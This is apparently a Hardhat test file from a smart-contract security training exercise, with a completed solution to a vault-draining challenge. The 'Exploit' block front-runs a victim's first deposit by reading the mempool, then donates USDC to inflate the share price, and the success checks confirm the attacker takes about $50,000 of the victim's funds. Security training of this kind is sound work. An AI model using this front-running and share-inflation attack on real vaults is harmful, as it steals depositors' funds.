const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Optimizer Vaults 101: Exercise 1", () => {
  /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

  let deployer, attacker, bob;

  const ATTACKER_USDC_BALANCE = ethers.utils.parseUnits("100000", 6).add(1); // Attacker has 100,000 + 1 wei USDC
  const BOB_USDC_BALANCE = ethers.utils.parseUnits("200000", 6); // Bob has 200,000 USDC

  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const WHALE = "0xf977814e90da44bfa03b6295a0616a897441acec";

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, attacker, bob] = await ethers.getSigners();

    // Load tokens
    this.usdc = await hre.ethers.getContractAt(
        "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
        USDC,
        deployer
    );

    // Whale impersonation
    const whaleSigner = await ethers.getImpersonatedSigner(WHALE);

    // Set attacker, bob, & whale balance to 2 ETH
    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x1BC16D674EC80000", // 2 ETH (ETH -> WEI -> Hexdecimal)
    ]);
    await ethers.provider.send("hardhat_setBalance", [
      whaleSigner.address,
      "0x1BC16D674EC80000", // 2 ETH (ETH -> WEI -> Hexdecimal)
    ]);
    await ethers.provider.send("hardhat_setBalance", [
      bob.address,
      "0x1BC16D674EC80000", // 2 ETH (ETH -> WEI -> Hexdecimal)
    ]);

    // Transfer USDC to the attacker & bob
    await this.usdc
        .connect(whaleSigner)
        .transfer(attacker.address, ATTACKER_USDC_BALANCE);
    await this.usdc.connect(whaleSigner).transfer(bob.address, BOB_USDC_BALANCE);

    // Deploy the vault system
    const YieldContractFactory = await ethers.getContractFactory(
        "contracts/optimizer-vaults-1/YieldContract.sol:YieldContract",
        deployer
    );
    const StrategyFactory = await ethers.getContractFactory(
        "contracts/optimizer-vaults-1/OptimizerStrategy.sol:OptimizerStrategy",
        deployer
    );
    const VaultFactory = await ethers.getContractFactory(
        "contracts/optimizer-vaults-1/OptimizerVault.sol:OptimizerVault",
        deployer
    );

    this.yieldContract = await YieldContractFactory.deploy(USDC);
    this.strategy = await StrategyFactory.deploy(this.yieldContract.address);
    this.vault = await VaultFactory.deploy(this.strategy.address, "VAULT", "VLT");

    // Assign the vault to the strategy
    await this.strategy.setVault(this.vault.address);

    // Approve the vault for the attacker & bob
    await this.usdc.connect(attacker).approve(this.vault.address, ATTACKER_USDC_BALANCE);
    await this.usdc.connect(bob).approve(this.vault.address, BOB_USDC_BALANCE);

    // Bob initiates a tx to be the first depositor in the vault system
    await this.vault.connect(bob).deposit(BOB_USDC_BALANCE);
  });

  it("Exploit", async () => {
    /** CODE YOUR SOLUTION HERE */

    // Get all the tx's in the mempool
    const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
          "pending",
          true,
        ]);

    // TODO: You see that bob is going to be the first depositor in the vault, with $200,000. Find his Tx
    const bobDeposit = pendingBlock.transactions.find((tx) => tx.to.toLowerCase() == this.vault.address.toLowerCase());


    // TODO: You front-run bob so that you are the first depositor
    await this.vault.connect(attacker).deposit(1, {
      gasPrice: ethers.BigNumber.from(bobDeposit.gasPrice).add(1)
    });

    // TODO: You do something sneaky that allows you to take some of bob's funds!
    await this.usdc.connect(attacker).transfer(this.vault.address, ethers.utils.parseUnits("100000", 6), {
      gasPrice: ethers.BigNumber.from(bobDeposit.gasPrice).add(1)
    });

    await ethers.provider.send("evm_mine", []);

    // Withdraw vault balance
    const attackerVaultBalance = await this.vault.balanceOf(attacker.address);
    await this.vault.connect(attacker).withdraw(attackerVaultBalance);
  });

  after(async () => {
    /** SUCCESS CONDITIONS */

    await ethers.provider.send("evm_mine", []);

    // Attacker realizes at least $48,000 USDC gain
    expect(await this.usdc.balanceOf(attacker.address)).to.be.greaterThan(ATTACKER_USDC_BALANCE.add(ethers.utils.parseUnits("48000", 6)))

    // Bob withdraws his vault balance
    const bobVaultBalance = await this.vault.balanceOf(bob.address);
    await this.vault.connect(bob).withdraw(bobVaultBalance);

    // Bob loses roughly $50,000 USDC when he withdraws
    expect(await this.usdc.balanceOf(bob.address)).to.be.lessThan(
        BOB_USDC_BALANCE.sub(ethers.utils.parseUnits("49000", 6)))

  })
});
